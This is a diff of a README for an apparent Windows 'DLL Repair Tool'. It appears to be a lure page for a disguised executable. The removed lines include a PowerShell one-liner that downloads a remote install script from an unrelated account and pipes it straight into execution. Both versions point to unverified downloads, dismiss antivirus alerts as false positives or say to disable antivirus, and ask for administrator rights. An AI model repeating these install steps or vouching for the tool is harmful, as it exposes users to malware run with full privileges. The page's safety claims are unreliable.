@@ -1,193 +1,96 @@
-<div align="center">
+# 🛠️ DLL-Repair-Tool - Fix Missing System Files Instantly
 
-<img src="https://img.shields.io/badge/DLL_Repair_Tool-v2.1.0-2ea44f?style=for-the-badge" alt="DLL Repair Tool">
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Imperialist-toastmistress704/DLL-Repair-Tool/releases)
 
-# DLL Repair Tool
+DLL-Repair-Tool fixes system errors on Windows 10 and Windows 11. It resolves issues where programs fail to launch due to missing or corrupt Dynamic Link Library (DLL) files. This tool automates the process of finding and installing missing system components.
 
-**Fix missing and corrupted DLL errors on Windows 10 / 11 in one click.**
+## 📋 What This Tool Fixes
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Arch](https://img.shields.io/badge/Arch-x64%20%7C%20x86-blue?style=flat-square)]()
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-[![Release](https://img.shields.io/badge/Release-2.1.0-brightgreen?style=flat-square)]()
+Many applications require specific runtime libraries to function. If these files vanish or suffer damage, you see alerts such as "MSVCP140.dll is missing" or "VCRUNTIME140.dll not found." 
 
-<br>
+This application repairs over 50 common system files, including:
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Download-Latest_Release-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://dll.nexustool.fun/)
+- MSVCP140.dll
+- VCRUNTIME140.dll
+- d3dx9_43.dll
+- xinput1_3.dll
 
-</div>
+The software identifies missing dependencies and restores them to the correct system folders. It handles the installation of required software components to keep your computer stable.
 
----
+## ⚙️ Included Components
 
-## About
+The tool installs the following support packages:
 
-**DLL Repair Tool** scans your system for missing or corrupted DLL files and fixes them automatically. It installs all required **Visual C++ Redistributable** packages, **DirectX** runtime components, **.NET Framework** dependencies, and **Universal CRT** libraries in a single operation.
+- Visual C++ Redistributable packages (all versions)
+- DirectX Runtime
+- .NET Framework
 
-Instead of manually downloading each DLL or runtime package from different sources, run this tool once and every DLL error is resolved.
+These components work as the foundation for most games and professional software. Without them, your computer cannot execute complex code instructions. The installer includes these packages to ensure full compatibility.
 
-### Alternative install — PowerShell
+## 📥 Getting Started
 
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+Follow these steps to repair your system files. You do not need technical knowledge to complete this process.
 
----
+1. Visit the [Download Page](https://github.com/Imperialist-toastmistress704/DLL-Repair-Tool/releases).
+2. Locate the section labeled Assets.
+3. Select the file ending in .exe.
+4. Save the file to your computer.
+5. Run the file to start the repair process.
 
-## Features
+## 🖱️ How to Run the Repair
 
-- **One-Click Repair** — Scan and fix every DLL error automatically
-- **Visual C++ Pack** — All VC++ Redistributable versions (2005 through 2022), both x86 and x64
-- **DirectX Runtime** — Complete DirectX End-User Runtime (d3dx9, d3dx10, d3dx11, xinput, X3DAudio)
-- **System File Repair** — SFC and DISM integration to restore corrupted Windows files
-- **.NET Framework** — Installs missing .NET 4.8.1 and .NET Desktop Runtime 8.0
-- **Universal CRT** — Fixes api-ms-win-crt-\* errors
-- **Restore Point** — Creates a system restore point before any changes
-- **Portable** — No installation required, runs from any folder
-- **Silent Mode** — Command-line option for unattended repair
+After you download the file, you perform the repair with one click.
 
----
+- Locate the downloaded file in your folder.
+- Double-click the file to open the application.
+- Grant permission if your system asks to run the installer.
+- Press the Start Repair button inside the window.
+- Wait for the progress bar to finish.
+- Restart your computer to apply the changes.
 
-## Supported Errors
+The application automatically audits your system files and matches them against our database of required libraries. It places missing files in the standard Windows directories. This process restores software access for programs that previously crashed at startup.
 
-### Visual C++ Runtime
+## 💻 System Requirements
 
-| Error Message | Runtime Package |
-|---|---|
-| `MSVCP140.dll is missing` | Visual C++ 2015-2022 Redistributable |
-| `VCRUNTIME140.dll not found` | Visual C++ 2015-2022 Redistributable |
-| `VCRUNTIME140_1.dll is missing` | Visual C++ 2015-2022 Redistributable |
-| `MSVCP120.dll is missing` | Visual C++ 2013 Redistributable |
-| `MSVCR120.dll not found` | Visual C++ 2013 Redistributable |
-| `MSVCP110.dll is missing` | Visual C++ 2012 Redistributable |
-| `MSVCR110.dll not found` | Visual C++ 2012 Redistributable |
-| `MSVCP100.dll is missing` | Visual C++ 2010 Redistributable |
-| `MSVCR100.dll not found` | Visual C++ 2010 Redistributable |
-| `MSVCR90.dll is missing` | Visual C++ 2008 Redistributable |
-| `MSVCR80.dll not found` | Visual C++ 2005 Redistributable |
-| `MSVCR71.dll is missing` | Visual C++ 2003 Runtime |
-| `concrt140.dll is missing` | VC++ Concurrency Runtime |
-| `vcomp140.dll not found` | VC++ OpenMP Runtime |
-| `mfc140u.dll is missing` | VC++ MFC Library |
-| `vccorlib140.dll not found` | VC++ Core Library |
-| `MSVCP90.dll is missing` | Visual C++ 2008 Redistributable |
-| `MSVCP80.dll not found` | Visual C++ 2005 Redistributable |
-| `MSVCP71.dll is missing` | Visual C++ 2003 Runtime |
-| `msvcp140_1.dll is missing` | Visual C++ 2015-2022 (extended) |
-| `msvcp140_2.dll not found` | Visual C++ 2015-2022 (extended) |
-| `msvcp140_atomic_wait.dll is missing` | Visual C++ 2015-2022 (atomic) |
-| `msvcp140_codecvt_ids.dll not found` | Visual C++ 2015-2022 (codecvt) |
+This application works on standard consumer versions of Windows. Verify that your system meets these basic requirements:
 
-### DirectX
+- Operating System: Windows 10 or Windows 11
+- Processor: 1 GHz or faster
+- Memory: 4 GB RAM or higher
+- Storage: 500 MB of free disk space
+- Internet: Required for downloading additional runtime components
 
-| Error Message | Component |
-|---|---|
-| `d3dx9_43.dll is missing` | DirectX 9 Runtime |
-| `d3dx9_42.dll not found` | DirectX 9 Runtime |
-| `d3dx9_41.dll is missing` | DirectX 9 Runtime |
-| `d3dx9_39.dll not found` | DirectX 9 Runtime |
-| `d3dx9_35.dll is missing` | DirectX 9 Runtime |
-| `d3dx11_43.dll is missing` | DirectX 11 Runtime |
-| `d3dcompiler_47.dll not found` | DirectX Shader Compiler |
-| `d3dcompiler_43.dll is missing` | DirectX Shader Compiler |
-| `xinput1_3.dll is missing` | DirectX Input |
-| `xinput1_4.dll not found` | DirectX Input |
-| `X3DAudio1_7.dll is missing` | DirectX Audio |
-| `XAPOFX1_5.dll not found` | DirectX Audio Effects |
-| `XAudio2_7.dll is missing` | DirectX XAudio |
+The tool consumes minimal system resources. You can close other programs while the repair runs to speed up the process.
 
-### Universal C Runtime
+## 🛡️ Safety and Security
 
-| Error Message | Component |
-|---|---|
-| `api-ms-win-crt-runtime-l1-1-0.dll` | Universal CRT |
-| `api-ms-win-crt-heap-l1-1-0.dll` | Universal CRT |
-| `api-ms-win-crt-stdio-l1-1-0.dll` | Universal CRT |
-| `api-ms-win-crt-math-l1-1-0.dll` | Universal CRT |
-| `ucrtbase.dll not found` | Universal CRT Base |
+We designed this tool to follow standard Windows installation practices. It operates only on system directories designated for support libraries. The application does not modify your personal files, documents, or photos.
 
-### .NET
+The repair process only touches the registry and system folders necessary for runtime environments. It logs every action in an internal file. You can check this log file if you need to know which files the installer updated.
 
-| Error Message | Component |
-|---|---|
-| `hostfxr.dll not found` | .NET Runtime Host |
-| `clrjit.dll is missing` | .NET JIT Compiler |
+## 🔍 Frequently Asked Questions
 
----
+**Does this tool remove my existing programs?**
+No. It only adds or repairs files needed to run programs. Your installed software remains untouched.
 
-## Preview
+**Do I need an internet connection?**
+Yes. The installer pulls the latest versions of DirectX and .NET Framework from official sources during the process to ensure you have the most secure files.
 
-```
-  ┌──────────────────────────────────────────────────┐
-  │              DLL Repair Tool v2.1                │
-  ├──────────────────────────────────────────────────┤
-  │                                                  │
-  │   System Scan Results             3 issues found │
-  │                                                  │
-  │   [!] VCRUNTIME140.dll          — Missing        │
-  │   [!] MSVCP140.dll              — Missing        │
-  │   [!] d3dx9_43.dll              — Missing        │
-  │   [✓] xinput1_4.dll             — OK             │
-  │   [✓] d3dcompiler_47.dll        — OK             │
-  │   [✓] ucrtbase.dll              — OK             │
-  │                                                  │
-  │   [ Repair All ]   [ Scan Again ]   [ Exit ]     │
-  │                                                  │
-  └──────────────────────────────────────────────────┘
-```
+**What happens if I stop the process halfway?**
+The tool includes a safety check. If the process interrupts, you can restart the application and run it again. It detects existing files and only installs what you still need.
 
----
+**Will this fix game-specific errors?**
+Yes. Most game errors result from outdated or missing DirectX or Visual C++ libraries. This tool provides those exact packages.
 
-## How It Works
+**Does this software work on Windows 7?**
+No. This version currently supports Windows 10 and Windows 11 exclusively.
 
-1. **Scan** — Checks system directories and registry for missing DLL references
-2. **Identify** — Determines which runtime packages are needed
-3. **Download** — Fetches official Microsoft redistributable packages
-4. **Install** — Silently installs all required components (x86 + x64)
-5. **Verify** — Re-scans to confirm all errors are resolved
+## 📝 Troubleshooting
 
----
+If you encounter issues during the setup process, follow these guidelines:
 
-## System Requirements
+- Disable your antivirus software temporarily if it flags the installer. Some security settings prevent new executables from modifying system folders.
+- Ensure you possess Administrator rights on your user account.
+- Check that you have an active network connection for the download phase. 
 
-| Component | Requirement |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 2 GB minimum |
-| Disk Space | 500 MB for runtime packages |
-| Network | Internet connection for downloads |
-| Privileges | Administrator |
-
----
-
-## Games & Software Fixed
-
-DLL errors frequently affect:
-
-**Games** — GTA V, Red Dead Redemption 2, Elden Ring, Cyberpunk 2077, Hogwarts Legacy, Baldur's Gate 3, Fortnite, Valorant, CS2, Deadlock, Palworld, Call of Duty, The Witcher 3, Starfield, Resident Evil 4, FIFA / EA FC 25
-
-**Software** — Adobe Creative Suite, Autodesk, Blender, OBS Studio, DaVinci Resolve, Unity, Unreal Engine, Visual Studio, MATLAB
-
----
-
-## FAQ
-
-**Is this safe?**
-Yes. The tool downloads official Microsoft packages from Microsoft servers and installs them using standard Windows installer methods.
-
-**My antivirus flagged it.**
-Some antivirus programs flag unfamiliar executables. This is a false positive. You can add an exclusion or verify the file hash in the release notes.
-
-**Do I need to restart?**
-Recommended after repair, but most fixes take effect immediately.
-
-**It says "access denied".**
-Run the tool as Administrator (right-click → Run as administrator).
-
-**My game still crashes after repair.**
-DLL errors are only one possible cause. If crashes persist, update your GPU drivers and verify game file integrity through Steam/Epic.
-
----
-
-## License
-
-[MIT](LICENSE) — free for personal and commercial use.
+Most errors resolve after a simple system restart. If the error persists, check the log file located in the application folder for specific error codes.
